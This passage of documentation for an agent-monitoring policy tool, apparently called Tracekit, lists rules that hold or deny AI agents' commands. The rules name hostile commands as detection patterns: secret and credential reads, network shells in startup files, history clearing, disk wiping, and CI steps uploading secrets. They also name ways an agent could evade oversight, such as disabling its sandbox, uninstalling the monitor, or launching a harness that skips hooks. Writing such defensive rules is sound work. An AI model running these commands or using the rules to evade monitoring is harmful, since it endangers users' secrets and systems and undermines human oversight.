`apply_patch` with `exec -a` or `env --argv0`, through a wrapper or a nested shell; `.bat` or `.cmd` on Windows) and `--codex-run-as-apply-patch` as a program's first argument (`codex`, its binary under another name, or after its npm launcher's script), which Codex applies itself, so no file rule reads the patch's files; every such patch is held, one to an ordinary file too; `git apply` and `patch` aren't held · `TK-A035` reading a secret's value from a secret store: `aws secretsmanager get-secret-value` and `batch-get-secret-value`; `aws ssm get-parameter`, `get-parameters`, `get-parameters-by-path` and `get-parameter-history` with `--with-decryption` (`--no-with-decryption` is not it); `gcloud secrets versions access` (also `alpha` and `beta`); `az keyvault secret show`, `show-deleted` and `download`, each with up to eight options before the service and before each of its words, and `--with-decryption` also as any prefix of it (`--with-d`); and the value reads of 1Password (`op read`, `op inject`, `op item get` with `--reveal`, `--fields`, `--otp` or `--format json`, `op document get`), Bitwarden (`bw get password`, `item`, `notes`, `totp` or `attachment`, `bw list items`, `bw export`), Doppler (`doppler secrets` and its subcommands; `set` prints the values it sets, `delete` and `upload` every value), Infisical (`infisical secrets`, `infisical export`) and LastPass (`lpass show`, `lpass export`). Listing and describing secrets, reading a parameter without decryption, help as `--help` right after a held command's own words (`op read --help`, `doppler secrets get --help`; doppler's and infisical's `--help` before plain words too), `doppler secrets --only-names` among doppler's own flags, with a project or config given by name, and infisical's `secrets set`, `delete`, `folders create` or `get` and `generate-example-env` are not held. It doesn't see a command built in a variable, one run inside a container or remote shell, an SDK call in an interpreter one-liner (`python -c`, `node -e`), or another store (`vault kv get` and `kubectl get secret` are `TK-A053`'s and `TK-A052`'s) · `TK-A036` the same commands as the `cli_command` (also `cliCommand`), `command` or `cmd` argument of an MCP tool (the AWS API MCP server's `call_aws`), for a tool whose name ends in a word for running a command (`aws`, `cli`, `command`, `cmd`, `exec`, `execute`, `run`, `shell`, `bash`, `terminal`; so that no MCP call over 64 KiB turns into an ask), when the value starts with the program, after spaces only (no tab, path, wrapper, `VAR=` prefix or `cd x &&` is read there); `TK-A035`'s help and names-only forms are held here too, since the call is read as one text · `TK-A037` the same through an MCP tool whose name says it returns a secret (`get_secret_value`, `batch_get_secret_value`, `GetSecretValue`, `access_secret_version`, `get_secret`, `keyvault_secret_get` and the like, as `mcp__<server>__<tool>` or `mcp:<server>/<tool>`, with `_` or `-` between the words, or in CamelCase); a tool that lists, describes, creates or writes secrets isn't held, nor is GitHub's secret scanning · `TK-A038` an MCP tool that reads an SSM parameter (`get_parameter`, `get_parameters`, `get_parameters_by_path`, `get_parameter_history`) with decryption turned on (`WithDecryption`, `with_decryption`, `withDecryption`, `decrypt` or `decryption` set to true, `"true"` or `1`) · `TK-A052` reading a Kubernetes secret's value or creating a token: `kubectl` or `oc` `get` of a secret (in any case, with its API group, as `TYPE/NAME`, in a list such as `cm,secrets`, or a later `TYPE/NAME`) with any `-o`/`--output` but `name` and `wide` (`yaml`, `json`, `jsonpath`, `go-template`, `custom-columns`) or a `--template`, before or after the type, and `get --raw` of a path with a `/secrets/` segment or ending in `/secrets`; `oc extract` of a secret; `view-secret` (also `kubectl-view-secret`); `create token`; up to eight options before the command and the type, where `-n`/`--namespace` takes its value (`-n secrets` is a namespace) and a type ends at a space, `/` or `,` (`clusterrole secret-reader` isn't held) · `TK-A053` reading a Vault secret or creating a Vault token: `vault` (or OpenBao's `bao`) `kv get`, `read`, `unwrap`, `print token`, `token create` and `write auth/token/create` (also `create-orphan` and a role); listing engines, policies and paths, `kv metadata get`, `token lookup` and `status` aren't held · `TK-A003` running a command outside Claude Code's sandbox: a call whose `dangerouslyDisableSandbox` argument is `true` ([Claude Code's sandbox](integrations/claude-code-sandbox.md)) · `TK-A014` opening network hosts beyond Claude Code's sandbox for one command: a call (`Bash`, `bash`, `PowerShell` or `Monitor`) whose `allowed_domains` (auto mode's per-command allow list) names any host ([Claude Code's sandbox](integrations/claude-code-sandbox.md#per-command-allowed-domains-tk-a014)) · `TK-A004` running a command with more than Gemini CLI's sandbox allows: a call whose `additional_permissions` turns the network on or names a path to read or write ([Gemini CLI's sandbox](integrations/gemini-sandbox.md)) · `TK-A010` adding something that runs at every login or boot: a file-editing tool writing under `Library/LaunchAgents/` or `Library/LaunchDaemons/`, `.config/systemd/user/`, `.config/autostart/`, `/etc/systemd/system`, `/etc/init.d`, `/etc/rc.local`, `/etc/xdg/autostart` or `lib/systemd/system/` or `user/`, or a login script or cron file: `.bashrc`, `.bash_profile`, `.profile`, `.zshrc`, `.zprofile`, `/etc/profile`, `/etc/profile.d/`, `/etc/bash.bashrc`, `/etc/init/`, `/etc/rc*.d/`, `/etc/cron*` or `/var/spool/cron/` · `TK-A011` the same from the shell: `cp`, `install`, `mv` or `ln` into those places (the last word, or `-t`'s directory, the place itself or a file in it), `tee`, a redirect, `sed -i` or `dd of=` naming them, and `launchctl load`/`bootstrap`/`enable` or `systemctl enable`/`reenable`/`preset`/`add-wants` after any options; each command on its own, as `TK-D010` reads them, and in any case; listing them, copying out of them and reading them (but for a read redirected with `<`) and managing an existing service (`systemctl status`, `restart`) are not held · `TK-A082` `TK-A010`'s places written by any of the shell's writers (as `TK-D023` reads them), a home's bash and zsh startup files left to `TK-F025` · `TK-A012` writing a Git hook (a path under `.git/hooks/`, or a submodule's under `.git/modules/<name>/hooks/`, a name of up to eight parts) · `TK-A013` the same from the shell (`cp`, `install`, `mv` or `ln` into `.git/hooks` or a submodule's, as `TK-A011` reads them; `tee`, a redirect, `chmod` or `sed -i` naming it), and setting or unsetting `core.hooksPath` with `git config` (after at most eight global options, as `TK-A002` reads `push`), which points every hook at another directory; reading it (`git config --get core.hooksPath`) is not held · `TK-A083` a Git hook written by any of the shell's writers (as `TK-D023` reads them) · `TK-A075` creating a login, adding a user to `sudo`, `wheel` or `admin`, or making a login root (`useradd`, `adduser`, `usermod` with a group option or `-u 0`, `gpasswd -a`/`-M`/`-A`, `dscl . -create /Users/…`, macOS's `sysadminctl -addUser`, `-deleteUser` or `-resetPasswordFor` and `dseditgroup -o edit -a <user>` to `admin` or `wheel`) · `TK-A076` a command writing `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/gshadow`, `/etc/sudoers` or `/etc/sudoers.d/` (a redirect, `tee`, `cp`, `mv`) · `TK-A077` setting the setuid or setgid bit (`chmod`, or `install -m`/`--mode` or a GNU prefix of it, `--m`, `--mo`, `--mod`, adding an `s` with `+` or `=` in any clause, `u+s`, `+sx`, `g+s,u+x`, `u=rwxs`, or a numeric mode with the bit set, `4755`, `7755`, `04755`; `u-s` and `1777` aren't held) or privileged file capabilities (`setcap` granting `cap_setuid`, `cap_setgid`, `cap_sys_admin`, `cap_dac_override`, `cap_dac_read_search`, `cap_fowner`, `cap_chown`, `cap_sys_ptrace` or `cap_sys_module`, by name in any case or by number (decimal, octal or hex: `7`, `07`, `0x7`), also given to `setcap -` on its stdin, by a pipe, a herestring or a heredoc (piped input the policy can't read exactly, and a heredoc or herestring holding a variable or a substitution, are held as every capability), or every capability, `all` or an empty list, `=ep`; any operator before the flags, `=+ep`, `-e+p`; `setcap -r`, `setcap -v`, `cap_setuid-ep` and `cap_setuid=` aren't held) · `TK-A078` writing a network shell (`/dev/tcp/`, `/dev/udp/`, `socat`, or `nc`, `ncat` or `netcat` with `-e`, `-c`, `--exec` or `--sh-exec`) into a bash or zsh startup file, the ones `TK-F011` names · `TK-A085` a write or edit of a `.md` file under `.agents/skills/`, or of `AGENTS.md`, `agent.md`, `CLAUDE.md`, `GEMINI.md` or `.cursorrules` in any folder, whose text holds a `` !`cmd` `` (text without one isn't held) · `TK-A020` targeted reads of named OS/browser credential stores (Firefox's profiles on Linux, macOS and Windows too), in any case (a Grep of a whole store's directory too) · `TK-A021` commands that read those stores (`security find-generic-password` or `find-internet-password`, also after security's global options; `secret-tool lookup`; `kwallet-query`; every `pass` or `gopass` command that decrypts an entry, `pass NAME` and `gopass NAME` included; `keepassxc-cli` `show`, `clip` and `attachment-export`, also as `keepassxc-cli.exe` and after its options; `gh auth token`, and `gh auth status` with `-t`/`--show-token` — a plain one masks it; `git credential fill` and each credential helper's `get` (`git credential-store get`, also the `git-credential…` binaries' spelling) — they print the stored username and password, while `approve`/`reject` and `store`/`erase` don't read one; `gh auth git-credential get` prints the stored token the same way, `store` and `erase` aside; `aws configure get` of a secret field — `aws_secret_access_key`, `aws_session_token` or `aws_security_token`, a `profile.` prefix allowed — prints the stored secret, while `region`, `aws_access_key_id`, `list` and `set` don't; `glab config get token` (a `--host` allowed) and `glab auth status` with `-t`/`--show-token` print the stored GitLab token, a plain `glab auth status` masking it — glab has no `auth token`; `kubectl` and `oc` `config view` redact the credential fields unless `--raw` or `--flatten` is given, so a view carrying either (before `config`, between it and `view`, or after any of view's options) is held, `--raw=false` and a plain view aside; `gcloud auth print-access-token` and `print-identity-token` (the `application-default` forms and the alpha and beta tracks too) print a live token minted from the stored credentials, while `auth login`, `list` and `revoke` don't print one; `gcloud config config-helper` is held in any format, as its default output holds the access token; `aws ecr get-login-password` prints a registry password) or list an SSH agent's keys (`ssh-add -L`, also after other options or anywhere in a cluster, `-qL`, `-Lq`) · `TK-A022` writes to Docker daemon configuration or socket · `TK-A023` a `docker` or `podman` `run`, `create` or `exec` (also `container run`, and after the CLI's global options: `docker -H host`, `--context prod`, `podman --remote`) with host privileges (`--privileged`, `--cap-add=ALL`), the host's process space or a mount of the host's `/`, `/proc`, `/etc` or `/root` · `TK-A024` writes to known package-source configuration files · `TK-A030` the same from the shell: a file `effects` names (a redirection, `tee`, `cp`, `mv`, `install`, `ln`, `dd` or `sed -i` writing `.npmrc`, `pip.conf`, `.pypirc`, apt sources or yum repos) · `TK-A025` installs with an explicit index or registry (also `-f`/`--find-links`, a pip option's unique prefix such as `--index-u`, `uvx`, `npx`, any `pipN.N`, and pip run as `python -m pip` after python's own options or as `py -m pip`), a `config set` (`npm set`) of one (after global options too, `pip --isolated config set`), or a source variable pip, uv or npm read (`PIP_INDEX_URL=… pip install`, `export npm_config_registry=…`), npm's `--@scope:registry=`, gem's `-s` and `gem sources --add`; publishing is exempt · `TK-A026` writes to named shell-history files or `/var/log`, in any case · `TK-A027` the same from the shell: a history file (by its name, or `$HISTFILE`) or `/var/log` (macOS's `/private/var/log` too, and `//var/log`) that `effects` names as written or deleted, in any case · `TK-A029` clearing shell history (`history -c`), deleting its entries (`history -d`), turning it off (`unset HISTFILE`, also `unset -v`, `set +o history`, `HISTFILE` empty or `/dev/null`, `HISTSIZE=0`, `HISTFILESIZE=0`, zsh's `SAVEHIST=0`, a `*` pattern in `HISTIGNORE` or zsh's `HISTORY_IGNORE`, also after `export`, `declare`, `typeset`, `readonly` or `local`) or vacuuming the journal (`journalctl --vacuum-*`) · `TK-A028` installing a package directly from a version-control source anywhere in the install's words (`git+https://`, `git+ssh://`, `git://`, npm's `github:` and its kin, a PEP 508 `name @ git+…`, `npm i`, `cargo install --git`) · `TK-A031` destroying cloud storage data: a version purge (`gsutil rm -a`, `gcloud storage rm --all-versions`, an S3 object version), a recursive delete or a wildcard delete (`*` only: `?` and `[…]` are flagged), a batch delete or a bucket delete (gsutil, gcloud storage, aws s3 and s3api, az storage blob, file, fs and container, `az storage remove --recursive`, rclone, s3cmd), with up to eight options before the service and again before its verb, also after an argument with a newline in it; one object's delete is only flagged (`TK-F003`) · `TK-A039` dropping, truncating or deleting without a WHERE through a database client: `psql -c`/`--command`, `mysql`/`mariadb -e`/`--execute`, `mongosh`/`mongo --eval` (`db.dropDatabase()`, `drop`, `deleteMany`/`deleteOne`/`remove` with an empty filter, also on `db.getSiblingDB(…)`, `db.getCollection(…)` or `db['…']`), `sqlite3`'s bare SQL argument, `clickhouse-client` or `clickhouse client --query`, `redis-cli`/`valkey-cli`/`keydb-cli` `FLUSHALL`/`FLUSHDB` as the last word after only options (a key named `flushall` isn't one), a DELETE in or after a CTE (`WITH d AS (DELETE …)`) or under `EXPLAIN ANALYZE`, and a client through a `docker`, `podman`, `kubectl` or `oc exec` wrapper (options before `exec` too, and a shell's `-c` inside it); a transaction that ends in `ROLLBACK` does not exempt the statement: a rolled-back destructive statement is held like any other. A SELECT, SHOW, EXPLAIN, a scoped DELETE and read-only calls are not held · `TK-A040` a cache flush piped into `redis-cli` or `valkey-cli`: echo or printf printing exactly `FLUSHALL`/`FLUSHDB` (optionally `ASYNC`/`SYNC`; printf also through a plain `%s` format), optionally through tee stages; a flush word merely appearing in piped text is not held · `TK-A041` a destructive SQL statement in an SQL-like tool's `sql`/`query`/`statement` argument (an MCP tool, or one a pack maps to class `sql`, as the dev pack's server parts map `mcp:postgres/query` and kin) (DROP needs its object word: TABLE, DATABASE, SCHEMA and the rest); it reads the tool's name, so a non-SQL tool whose `query` text is itself a destructive statement is not held, and there is no ROLLBACK exemption · `TK-A086` the same statements in an SQL-like MCP tool's arguments as every SQL dialect lexes them (the `run` field), so a comment one database reads otherwise than `TK-A041`'s one reading (a nested `/* */`, a `--` before a control character) doesn't hide one · `TK-A054` removing or stopping Tracekit as a person would: `tracekit uninstall` or `down` (also as `python -m tracekit` or `tracekit.cli`, after up to eight of python's options), uninstalling its package (`tracekit-ai`, in any case, with a run of `-`, `_` or `.` before `ai`) with `pip`, `python -m pip`, `uv` (`pip`, `tool` or a project's `remove`), `pipx` or `poetry`, its Claude Code or Hermes Agent plugin's `uninstall`, `disable` or `remove` (`claude plugin`), removing its Claude Code marketplace (`claude plugin marketplace remove` or `rm`, which uninstalls the marketplace's plugins), and `systemctl` stopping, disabling, killing or masking a unit named tracekit after any options (`--user`); held, not denied, so a person who means it can approve it, while `TK-D007` denies touching the signer's files or process directly · `TK-A079` wiping a disk or a filesystem: `dd` whose `of=` is a block device (`/dev/sd*`, `/dev/nvme*`, `/dev/md*`, `/dev/dm-*`, `/dev/disk/by-*/…`, `/dev/mapper/*`, …), `mkfs`, `mke2fs`, `mkswap`, `mkdosfs`, `mkntfs` or `newfs` making one on such a device after up to sixteen options, `shred`, `wipefs` or `blkdiscard` erasing one after up to sixteen options, `sgdisk --zap-all`, `--zap` or `--clear` (`-Z`, `-z`, `-o`), `parted … mklabel` (or `mktable`) and `sfdisk -X`/`--label` (or `-Y`/`--label-nested`) on one, any command whose write target is such a device (a redirection, `cp`, `tee`; `TK-A080`), and `diskutil eraseDisk`, `eraseVolume`, `zeroDisk`, `secureErase`, `randomDisk` or `reformat`, the verb in any case · `TK-A057` the agent's own `tracekit init` (also as `python -m tracekit`), which rewrites Tracekit's hooks (`--no-hooks` takes them out), and its own `tracekit mcp-gateway` (also as `python -m tracekit.mcp_gateway`), which starts the programs its configuration names · `TK-A069` a harness's own command that changes its settings: Hermes Agent's `config set`, `unset`, `edit` or `migrate` and `profile use` · `TK-A070` an agent harness's CLI (Claude Code, Codex, Gemini CLI, Qwen Code, OpenCode, Kilo Code, goose, Droid, Antigravity CLI, Crush, Devin, Hermes Agent, Cline, OpenHands, Cursor's agent, GitHub Copilot CLI, CodeBuddy Code, gptme) started, also through npx, bunx, pnpx, pnpm dlx (at any version), a JavaScript runtime on its package's script or `python -m hermes_cli` or `gptme`, with settings the line chooses (the `harness_launch` field: `HOME`, `XDG_CONFIG_HOME` or the harness's own home, config, settings, profile, plugin, path, root or data variable set or unset in any way bash does, a loop's too, `env -i` or `-u` of them, claude's `--settings`, `--setting-sources` or `--bare`, `--config`, copilot's `--config-dir`, `--profile` (not gptme's), `codex -p`, `-c` with its hooks, notify, sandbox, approvals or profiles anywhere in its value and `--disable` of such a feature, `hermes -p`, words xargs gives it, or a word set at run time: a substitution, the positional parameters, a variable the line gives no value), and `codex features disable` of such a feature, which reads none of the person's settings and so runs none of their hooks; a model, effort or MCP option and another tool's variable (`-c model_reasoning_effort=high`, `--mcp-config`, `AWS_PROFILE`) aren't held · `TK-A084` `gh` running what its own commands don't say (the `gh_runs` field): an alias set or imported, an extension installed, upgraded, browsed for or run by `gh extension exec`, a command that is none of gh's own (an alias's or an extension's, `gh m 1`, `gh x`), and the editor, pager or browser `gh config set` names · `TK-F009` harness config file paths, held since #604 (a project's `.claude/settings.json` and its `disableAllHooks` among them; also Claude Code's `~/.claude.json` and, as the rest of `.claude/`, its skills and slash commands, Cursor's `.cursor/mcp.json`, Factory Droid's `.factory/`, Antigravity CLI's `.agents/hooks.json`, and goose's `.agents/plugins/`, `~/.config/goose`, and the recipes and sub-agents it loads from `recipes/` and `agents/` under `.agents/` or `.goose/`, in a project or the home folder) · `TK-F015` harness config shell write/delete targets (the same, OpenCode's `~/.config/opencode` or `$XDG_CONFIG_HOME/opencode` too, a write under `.agents/skills/`, whose skills OpenHands runs `` !`cmd` `` lines of, and a delete of a whole `.agents` folder); neither holds Claude Code's memory notes, nor an ordinary file in one of its worktrees (`.claude/worktrees/<name>/`, whose own harness config is held) · `TK-A088`, `TK-A089`, `TK-A090`, `TK-A091`, `TK-A092` the same written or deleted by PowerShell: a write cmdlet or alias where a command or block starts, or a `>`/`>>`, and such a path through `$env:USERPROFILE`, `%USERPROFILE%`, `$HOME`, `~` or `$PROFILE` on the command as typed, in either order within 8 words (32 characters after the path, quoted words right after it not counted), across its lines (after a quote or `(`, the aliases bash has too, and a redirection, with PowerShell's form of the path: `$env:USERPROFILE` or a `\`) (Kiro CLI's `execute_pwsh` is decided as `Bash`, Claude Code's `PowerShell` tool also as a shell line; five patterns, each led by one character set, so the fallback engine skips to where one can start) · `TK-A096` the Python the plugin's hook runs on Windows, named in PowerShell's or cmd's form, which bash's reading loses (an unquoted `\`) or can't parse: a uv tool's or pipx venv of `tracekit-ai` (`uv\tools`, `uv\data\tools`, `pipx\venvs`), `.local\bin\tracekit`, uv's folder and interpreters under `%APPDATA%` (`$env:APPDATA`, `%APPDATA%`, `AppData\Roaming`), pipx's under `%LOCALAPPDATA%` and `~\pipx`, on the command as typed in any case; a folder along one only as the path's end; a line that is one read (`Get-Content`, `gci`, `dir`, `cat` …) with no separator, redirection or subexpression isn't held |
| flag | `TK-F001` network commands · `TK-F002` web requests · `TK-F003` destructive commands (`rm`, `mv`, `chmod`, `chown`, `truncate`, `shred`, `unlink` and `dd of=` read from each command's argv: a target outside the project and the temp folders, the project's root or `.git`, or one the line can't tell, such as a variable; and `xargs` or `parallel` running one) · `TK-F004` side effects (push, publish, install, apply; git's push, send-pack, reset and clean after its global options too, and `hub push`) · `TK-F005` a secrets file (its name read as a path; label `secrets_file`) · `TK-F006` MCP tools, but those whose own name says they read (`get`, `list`, `search`, `read`, `find`, `describe`, `show`, `view`, `lookup`, `count`, `inspect`, `fetch`) or act only in the local browser (`navigate`, `screenshot`, `snapshot`, `console`, `network`, `logs`, `hover`, `wait`, `scroll`, `zoom`, `resize`, `tabs`) · `TK-F007` / `TK-F008` / `TK-F014` background processes · `TK-F016` `ANTHROPIC_BASE_URL` (or a provider's, `ANTHROPIC_BEDROCK_BASE_URL`, `ANTHROPIC_VERTEX_BASE_URL`) named in a Write, Edit or MultiEdit call's arguments · `TK-F017` the same named on a shell line, from any shell tool (an assignment prefix and the text a heredoc writes included); both read the name in any case, as Windows does, and flag a mention as well as a setting · `TK-F010` shell function or alias shadowing · `TK-F011` environment tampering, read from what the command acts on (its argv, assignments and redirections), but a `PATH` or `PYTHONPATH` assignment that adds only a relative folder (a venv in the project: `.venv/bin`), `$PWD` or a toolchain folder (nvm's node, go, cargo, Homebrew's) · `TK-F025` a bash or zsh startup file written by any of the shell's writers (as `TK-D023` reads them) · `TK-F012` egress (any URL a call acts on, but one on this machine or a single plain URL) · `TK-F013` egress (a network command, but curl, wget, HTTPie or xh reaching only this machine) · `TK-F024` egress (an upload tool's file: CodeBuddy Code's `LibraryUpload`) · `TK-F026` goose's `delegate` with a `source`, which runs a recipe and starts the stdio extensions it names (writing one where goose loads it is held: `TK-F009`, `TK-F015`) · `TK-F027` OpenHands' `invoke_skill`, which runs each `` !`cmd` `` of the skill (writing one is held: `TK-A085`, `TK-F015`) · `TK-F030` a push or publish read per command, however long (`PUSH:` subjects: a release created or published, an image pushed, a subtree push, a push setting written, a publishing CLI's command the line can't tell; [CLI grammars](#cli-grammars)), and a GitHub release created (`gh` or `hub release create`, gh's `new`), but a draft, read as `TK-A056` reads one · `TK-F048` a Git or cargo config file a file tool writes (`.git/config`, a submodule's or worktree's, `~/.gitconfig` and the files named for one it includes, `.gitconfig.local`, `.gitalias`, any `git/config`, `etc/gitconfig`, `.cargo/config.toml`, an installation's `cargo/config.toml`): a push mapping, an alias or a template there changes where a later push goes or what a command publishes; and a virtualenv's activate script (`bin/activate`, `activate.fish`, `Scripts/Activate.ps1`), which a later push's line may source · `TK-F049` a Git config section in git's syntax a file tool writes (`[alias]`, `[remote "…"]`, `[url "…"]`, `[include]`, `[includeIf "…"]`) into a file a Git config may include, not a source, document or data file |

`strict.yaml` is for an agent whose every change outside its workspace a person should see first: a push (`git`,
`docker`/`podman`, also an image built with `--push`, buildx bake, compose, `helm`, `git subtree`), a change to where pushes go (`git config remote.<name>.push`), a GitHub release created (a draft too) or a draft published, a publishing CLI's command whose subcommand the line can't tell (`git $X origin main`), a package install or publish (`npm`, `pnpm`, `yarn`, `bun`, `pip` of any version, `uv`,
`pipx`, `poetry`, `conda`, `cargo`, `gem`, `bundle`, `go`, `brew`, `apt`, `dnf`, `yum`, `apk`, `twine`), `docker run`
(`container run`, after global options too), `terraform`/`tofu apply`, `pulumi up`, `helm install`/`upgrade`, `kubectl
apply`/`delete` (after options too), a network command (`curl`, `ssh`, `sftp`, `dig`, `socat`, HTTPie, `xh`,
`openssl s_client`) and an environment change (`PATH=` or `PATH+=`, `LD_PRELOAD=`, `DYLD_INSERT_LIBRARIES=`,
`PYTHONSTARTUP=`, an append or `tee` to a bash or zsh startup file) wait for an approval, and a shell command the parser can't read is denied. Two flags stay flags: `TK-F007` matches `crontab -l`,
which only lists, and `TK-F012` (any URL a call acts on) would hold every web request and navigation (a fifth of E17's
benign calls). Its flags stay as wide as they were: `TK-F003` (a destructive command's word anywhere on a line),
`TK-F005` (every secrets-file name), `TK-F006` (every MCP call) and `TK-F012` (every URL). It holds more benign calls than the server pack, about one in twenty of E17's and one in seven of E21's sessions, and
catches more of E21's held-out harmful calls ([evaluation](evaluation.md#e21-policy-robustness) has the rates of both
packs, measured after rule changes, on a pool no longer blind). Use it where a person answers holds promptly,
not for an agent that works unattended on a laptop.

A deployment extends `server.yaml` (or composes only the packs it needs), maps its own tool names under `tools` (a
business tool no class fits, such as `book_hotel`, to `app`, so it isn't held as unknown), and redefines a rule by id
to change it: TK-N002's egress allowlist and TK-B011's typing allowlist name `example.com` until
it does. Cloud APIs are covered as CLI commands on a shell tool and as MCP tools; other cloud-SDK-shaped tools need a
mapping and rules of their own.

Server rules (ask rules hold the call for a person):

| Pack | Section | Rules |
|---|---|---|
| `server-core.yaml` | deny | `TK-S001` cloud metadata service (169.254.169.254 in any notation, fd00:ec2::254, metadata.google.internal, the short names metadata and instance-data, ECS and Alibaba) in what any tool acts on (`target`) · `TK-S002` / `TK-S003` a secret (private key, cloud, VCS, chat, payment or model API token, JWT, URL with a password) in any tool's arguments (`TK-S002` also right after an escaped newline, tab or CR in them) or a shell line · `TK-S004` credential files (cloud, kube, docker, gcloud, azure, service account token, .pgpass, .netrc, .git-credentials, SSH private keys, `/proc/*/environ`, a thread's and a task's too) in what any tool acts on (`target`: a path, a command's arguments and redirections, an attachment, an MCP tool's arguments with each path in them normalised; not file content, a commit message, an MCP tool's title, body, message or content, or a search tool's query) · `TK-S007` the same credential files named by any shell command through `$env:USERPROFILE` or `%USERPROFILE%` (`\` or `/`), or `$HOME` or `~` with a `\` after it or inside the path, read off the line as typed (PowerShell's form, which bash's argv loses), denied as `TK-S004` denies the bash form, a commit message naming one too · `TK-S006` a command run through another command's options (tar, its long options also as a unique prefix and `-I` in a cluster; git config keys in any case, any key ending in `cmd` or `command` and a `!` submodule update among them, and aliases; ssh's command keywords in any case after `-o`, for scp, sftp and rsync too; scp's and sftp's `-S`; rsync's `-e` and man's `-P` naming a shell or an interpreter; zip; rsync's `--rsync-path`; vim's ex commands that run one after `-c`, `--cmd` or `+`) |
| `server-core.yaml` | ask | `TK-S010` an MCP tool that takes a command (`command`, `cmd`, `script` or `shell_command`, in any case, one or a list: `Command`, `commands`) · `TK-S012` code or input through an MCP tool named for running code, a cell or a process (a word such as `run`, `exec`, `eval`, `notebook`, `cell`, `code`, `python` or `shell`, in snake, kebab or camel case, or a name ending in `process`): its `code`, `python_code`, `source`, `cell_source`, `cell_content` or `input`, or an `args`/`argv` list; those keys in another tool (a translation's `source`, a promo `code`) aren't held |
| `server-data.yaml` | deny | `TK-DB001` DROP · `TK-DB002` TRUNCATE · `TK-DB003` DELETE without a WHERE, or with a constant one (`1`, `TRUE`, `NOT FALSE`, two numbers or two literals compared, also in parentheses, or such a condition first before an `OR` or last after one, outside parentheses; MySQL's `DELETE t FROM t` and `DELETE IGNORE` too) · `TK-DB004` GRANT, REVOKE, ALTER/CREATE USER, ROLE or LOGIN (SQL Server's `SERVER ROLE` too), `sp_addrolemember`, `sp_addsrvrolemember` · `TK-DB005` COPY … PROGRAM, COPY from or to a server file, xp_cmdshell, xp_dirtree, xp_subdirs, xp_fileexist, server file functions, INTO OUTFILE, LOAD DATA INFILE, ATTACH, an untrusted procedural language (`plpython3u`, `plperlu`, `pltclu`, as a function's language or an extension), `OPENROWSET(BULK …)`, `BULK INSERT` |
| `server-net.yaml` | deny | `TK-N001` request to an internal address (`internal`) · `TK-N003` request to an internal name (localhost, a name without a dot, .internal, .local, .svc, …) · `TK-N002` a body or POST/PUT/PATCH to a host outside the allowlist |
| `server-cloud.yaml` | deny | `TK-C001` IAM, role binding, access key and public-bucket changes (aws, gcloud, gsutil, az, kubectl), and aws's SAML and OIDC providers, service-specific credentials, an access key turned back on, a secret's resource policy, SNS and SQS permissions and an EC2 or RDS snapshot made public (`all`) · `TK-C002` the same through an MCP tool, its name in any case and in snake_case, kebab-case, camelCase or PascalCase |
| `server-cloud.yaml` | ask | `TK-C010` deleting cloud resources (instances, databases, buckets, clusters, namespaces, stacks; a kubectl type in any case, by its short name, with its group or as `TYPE/NAME`, with options before or after it, also one of a list (`pod,ns`) or a later `TYPE/NAME`; not a delete from a file (`-f`, `-k`); helm uninstall, `del` or `un`; terraform, tofu and pulumi destroy in another tool's `cli_command`, `command` or `cmd` argument; on a shell tool they are the coding pack's `TK-A001`) and turning off AWS audit logging or detection (`cloudtrail` `stop-logging`, `delete-trail` and `put-event-selectors`, and `update-trail` with `--s3-bucket-name`, `--no-enable-log-file-validation`, `--no-include-global-service-events`, `--no-is-multi-region-trail` or `--no-is-organization-trail`; `guardduty` `delete-detector` and `disassociate-from-master-account` or `-administrator-account`, `update-detector` with `--no-enable` or a feature's `Status` `DISABLED` (shorthand or JSON), and `create-filter` or `update-filter` with `--action ARCHIVE`; `configservice` (or `config`) `stop-configuration-recorder`, `delete-configuration-recorder` and `delete-delivery-channel`; `securityhub` `disable-security-hub` and `batch-disable-standards`; `accessanalyzer` (or `access-analyzer`) `delete-analyzer`; `route53resolver` `delete-resolver-query-log-config` and `disassociate-resolver-query-log-config`; `organizations leave-organization`; an option within sixteen words of its command, as any unique prefix) · `TK-C011` an MCP tool whose name says it deletes, destroys, terminates, drops, purges, removes or wipes, truncates a table or collection, resets a branch, database, schema, data, project or table, or resets migrations (`migrate-reset`), in snake, kebab, camel or Pascal case (`deleteProject`, `DeleteBucket`); `reset_password` and `truncate_text` aren't held |
| `server-comms.yaml` | ask | `TK-M001` a payment with an amount · `TK-M002` payouts, transfers, charges and refunds by tool name, in snake or camel case (`createPayout`; over MCP also `issue_`, `process_`, `make_` or `initiate_` a payment, payout, transfer, charge or refund, and `transfer_money`) · `TK-M005` a payment tool by one of those names called with no amount (`issue_refund` for a full refund): with a number as its amount it is `TK-M001`'s alone, so a reviewer agent's bounds on `TK-M001` still decide it, and any other amount (null, empty, nested) is held by `TK-M005` too · `TK-M003` ten or more recipients, or a whole-company address · `TK-M004` @channel, @here or @everyone in Slack (`<!channel>`, or a plain `@channel` with `link_names` set, which Slack turns into one), or a user group's mention (`<!subteam^ID>`), through an MCP tool that posts, sends or adds a message or replies to a thread (`slack_post_message`, `conversations_add_message`, `chat_postMessage`) |

SQL keywords match `code`, outside comments, literals and quoted identifiers in every dialect, so
`SELECT 'DROP TABLE x'` is allowed. `eval/e17_policy_corpus.py`
runs `server.yaml` over the deny and benign corpora in `tests/data/policy/` with both engines and reports per-class deny
recall and the benign false-positive rate. A case for a rule only another pack defines (a dev-only rule, which the
server pack cannot hold) names its pack in the case as `"packs": ["dev"]` and is decided on it instead; the run reports
per-pack recall and false positives beside the totals.

Rules match raw strings: they are tripwires that make attempts visible, not the protection itself. The protection is
the signer's isolation, its storage and the witnesses ([server threat model](threat-model-server.md)).

### `TK-A061`: CI workflow command uploads

The coding pack asks before a **direct `Write` or `Edit`** introduces a CI command that uploads a variable or
secret expression as its **data argument** to an explicit `http://` or `https://` destination. Recognized files
are `.github/workflows/*`, `.github/actions/**/action.yml` or `action.yaml` (composite actions),
`.gitlab-ci.yml`, `.circleci/config.yml`, `azure-pipelines.yml` or `azure-pipelines.yaml`, and `Jenkinsfile`
(case-insensitive paths and Windows path forms). It checks `curl` and `wget` with `-d`, `-F`, combined short
flags such as `-sd`, `--data*`, `--form*`, `--json`, `--post-data` and `--body-data`;
the argument itself must contain `$VAR`, `${VAR}` or an expansion of it (`${VAR:-x}`, `${VAR#x}`), `${env.X}`,
`$env:X`, `$(SECRET)`, or a GitHub expression in any case: `${{ secrets.X }}`, `${{ secrets['X'] }}`,
`${{ env.X }}`, `${{ github.token }}` or `${{ toJSON(secrets) }}` (of `github` or `env` too). A JSON body is
read through its escaped quotes (`"{\"t\":\"$TOKEN\"}"`) and through quotes spliced into one word
